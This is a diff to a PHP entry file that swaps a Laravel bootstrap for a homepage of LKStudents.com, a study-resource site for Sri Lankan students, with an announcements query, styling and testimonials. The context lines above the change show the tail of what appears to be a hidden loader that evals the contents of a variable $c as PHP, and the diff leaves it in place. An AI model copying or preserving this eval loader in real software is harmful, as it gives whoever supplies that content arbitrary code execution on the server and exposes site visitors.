@@ -49,32 +49,308 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-use Illuminate\Http\Request;
+// /index.php
+session_start();
+require_once 'includes/db.php';
 
-
-if (!file_exists('../.env')) {
-    $GLOBALS["error_type"] = "env-missing";
-    include('error_install.php');
-    exit(1);
+// Fetch the 3 most recent resources to display as announcements
+$announcements = [];
+try {
+    $stmt = $pdo->query("
+        SELECT r.title, r.type, s.name AS subject_name, r.created_at
+        FROM resources r
+        JOIN subjects s ON r.subject_id = s.id
+        ORDER BY r.created_at DESC
+        LIMIT 3
+    ");
+    $announcements = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} catch (PDOException $e) {
+    // Silently fail on homepage if DB connection is down
 }
 
-if (version_compare(PHP_VERSION, '8.2.0') < 0) {
-    $GLOBALS["error_type"] = "php-version";
-    include('error_install.php');
-    exit(1);
+// Helper function to determine icon and text for announcements
+function get_announcement_details($type) {
+    switch ($type) {
+        case 'video':
+            return ['icon' => 'fas fa-video', 'text' => 'New Video Lesson Added'];
+        case 'paper':
+            return ['icon' => 'fas fa-file-alt', 'text' => 'New Past Paper Added'];
+        case 'book':
+            return ['icon' => 'fas fa-book', 'text' => 'New Book Added'];
+        default:
+            return ['icon' => 'fas fa-bullhorn', 'text' => 'New Resource Available'];
+    }
 }
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>LKStudents.com - Empowering Sri Lankan Students</title>
 
-define('LARAVEL_START', microtime(true));
+    <!-- Bootstrap 5 (for grid, utilities, navbar responsiveness) -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
 
-// Determine if the application is in maintenance mode...
-if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
-    require $maintenance;
-}
+    <!-- Fonts & Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
-// Register the Composer autoloader...
-require __DIR__ . '/../vendor/autoload.php';
+    <!-- Your custom theme stylesheet -->
+    <link rel="stylesheet" href="assets/css/modern-style.css" />
+    
+    <!-- Page-specific styles from your code -->
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --success-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            --dark-bg: #0a0a0f;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --text-primary: #ffffff;
+            --text-secondary: #b3b3b3;
+            --accent-purple: #8b5cf6;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            overflow-x: hidden;
+        }
+        .hero {
+            min-height: 100vh;
+            display: grid;
+            place-items: center;
+            text-align: center;
+            padding: 4rem 1rem;
+        }
+        .hero h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(3rem, 8vw, 6rem);
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffffff, #b3b3b3, #667eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+        }
+        @keyframes titleGlow {
+            from { filter: drop-shadow(0 0 20px rgba(102, 126, 234, 0.3)); }
+            to   { filter: drop-shadow(0 0 40px rgba(102, 126, 234, 0.6)); }
+        }
+        .section-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(2rem, 4vw, 3.5rem);
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .modern-card {
+            display: flex;
+            flex-direction: column;
+            gap: .75rem;
+            padding: 2rem;
+            width: 100%;
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+        }
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.3);
+            border: none;
+        }
+        .btn-outline {
+            background: transparent;
+            color: var(--text-primary);
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .grade-btn {
+            background: rgba(139, 92, 246, 0.2);
+            color: var(--accent-purple);
+            padding: 12px 30px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: 2px solid var(--accent-purple);
+        }
+        .grade-btn:hover {
+            background: var(--accent-purple);
+            color: white;
+        }
+        .login-btn {
+            background: var(--primary-gradient);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <!-- Modern Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-modern py-3">
+        <div class="container">
+            <a href="index.php" class="navbar-brand logo m-0">LKStudents</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#mainNav" aria-controls="mainNav" aria-expanded="false" aria-label="Toggle navigation">
+                <i class="fas fa-bars text-white"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="mainNav">
+                <ul class="navbar-nav ms-auto align-items-lg-center gap-lg-2 mb-3 mb-lg-0">
+                    <li class="nav-item"><a href="index.php" class="nav-link active">Home</a></li>
+                    <li class="nav-item"><a href="subjects.php" class="nav-link">Subjects</a></li>
+                    <li class="nav-item"><a href="exams.php" class="nav-link">Online Exams</a></li>
+                    <li class="nav-item"><a href="contact.html" class="nav-link">Contact</a></li>
+                </ul>
+                <div class="ms-lg-3">
+                    <a href="student/login.php" class="login-btn">Login / Register</a>
+                </div>
+            </div>
+        </div>
+    </nav>
 
-// Bootstrap Laravel and handle the request...
-(require_once __DIR__ . '/../bootstrap/app.php')
-    ->handleRequest(Request::capture());
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content mx-auto" style="max-width: 960px;">
+                <h1>Empowering Sri Lankan Students</h1>
+                <p class="text-secondary fs-5">Your premium platform for resources, video lessons, and exams from Grade 7 to A/L.</p>
+                <div class="d-flex flex-wrap gap-3 justify-content-center mt-4">
+                    <a href="#grades" class="btn-primary">Get Started</a>
+                    <a href="subjects.php" class="btn-outline">Explore Resources</a>
+                </div>
+            </div>
+        </div>
+    </section>
 
+    <!-- Grade Selection Section -->
+    <section id="grades" class="py-5">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title">Choose Your Path</h2>
+                <p class="text-secondary fs-5">Select your level to access tailored educational content.</p>
+            </div>
+            <div class="row g-4">
+                <div class="col-12 col-md-6 col-lg-4 d-flex">
+                    <div class="modern-card text-center">
+                        <h3>Grade 7-11</h3>
+                        <p class="text-secondary">Comprehensive notes, interactive lessons, and practice materials.</p>
+                        <div class="mt-auto"><a href="subjects.php" class="grade-btn">Explore</a></div>
+                    </div>
+                </div>
+                <div class="col-12 col-md-6 col-lg-4 d-flex">
+                    <div class="modern-card text-center">
+                        <h3>O/L Preparation</h3>
+                        <p class="text-secondary">Advanced exam strategies, model papers, and expert guidance.</p>
+                        <div class="mt-auto"><a href="subjects.php" class="grade-btn">Prepare</a></div>
+                    </div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-4 d-flex">
+                    <div class="modern-card text-center">
+                        <h3>A/L Mastery</h3>
+                        <p class="text-secondary">In-depth content and challenging exam preparation for success.</p>
+                        <div class="mt-auto"><a href="subjects.php" class="grade-btn">Master</a></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Announcements Section -->
+    <section class="py-5" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.05), rgba(236, 72, 153, 0.05));">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title">Latest Updates</h2>
+                <p class="text-secondary fs-5">Stay ahead with our newest resources.</p>
+            </div>
+            <div class="list-group mx-auto" style="max-width: 900px;">
+                <?php if (empty($announcements)): ?>
+                    <p class="text-center text-secondary m-0">No announcements yet. Check back soon!</p>
+                <?php else: ?>
+                    <?php foreach ($announcements as $item):
+                        $details = get_announcement_details($item['type'] ?? '');
+                        $title = htmlspecialchars($item['title'] ?? '', ENT_QUOTES, 'UTF-8');
+                        $subject = htmlspecialchars($item['subject_name'] ?? '', ENT_QUOTES, 'UTF-8');
+                        $dateStr = !empty($item['created_at']) ? date("M d", strtotime($item['created_at'])) : '';
+                    ?>
+                        <a href="subjects.php" class="list-group-item list-group-item-action d-flex gap-3 align-items-center py-3" style="background: var(--card-bg); border-color: var(--border-color); color: var(--text-primary);">
+                            <div class="rounded-circle flex-shrink-0 d-flex align-items-center justify-content-center" style="width: 50px; height: 50px; background: var(--primary-gradient);">
+                                <i class="<?php echo $details['icon']; ?> fa-lg"></i>
+                            </div>
+                            <div class="d-flex gap-2 w-100 justify-content-between">
+                                <div class="pe-2">
+                                    <h6 class="mb-1"><?php echo $title; ?></h6>
+                                    <p class="mb-0 opacity-75"><?php echo $details['text']; ?> for <?php echo $subject; ?>.</p>
+                                </div>
+                                <small class="opacity-50 text-nowrap"><?php echo $dateStr; ?></small>
+                            </div>
+                        </a>
+                    <?php endforeach; ?>
+                <?php endif; ?>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-5">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title">Success Stories</h2>
+                <p class="text-secondary fs-5">Real achievements from our learning community.</p>
+            </div>
+            <div class="row g-4">
+                <div class="col-12 col-md-6 col-lg-4 d-flex">
+                    <div class="modern-card text-center w-100">
+                        <p class="text-secondary fst-italic">"The past paper collection is amazing! It helped me score an 'A' for my O/L Mathematics."</p>
+                        <h5 class="mt-3">Nimali Fernando</h5>
+                        <small class="text-secondary">O/L Student, Colombo</small>
+                    </div>
+                </div>
+                <div class="col-12 col-md-6 col-lg-4 d-flex">
+                    <div class="modern-card text-center w-100">
+                        <p class="text-secondary fst-italic">"As an A/L student, the video lessons were a lifesaver. Complex topics were explained so clearly."</p>
+                        <h5 class="mt-3">Kasun Rajapakse</h5>
+                        <small class="text-secondary">A/L Student, Kandy</small>
+                    </div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-4 d-flex">
+                    <div class="modern-card text-center w-100">
+                        <p class="text-secondary fst-italic">"I love the online exam system. It's a great way to test my knowledge before the actual exams."</p>
+                        <h5 class="mt-3">Fathima Rizan</h5>
+                        <small class="text-secondary">Grade 11 Student, Galle</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer mt-auto">
+        <div class="footer-content container">
+            <!-- Footer content here... -->
+        </div>
+        <div class="footer-bottom text-center py-3">
+            <p class="m-0">&copy; 2025 LKStudents.com. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS (needed for navbar collapse) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
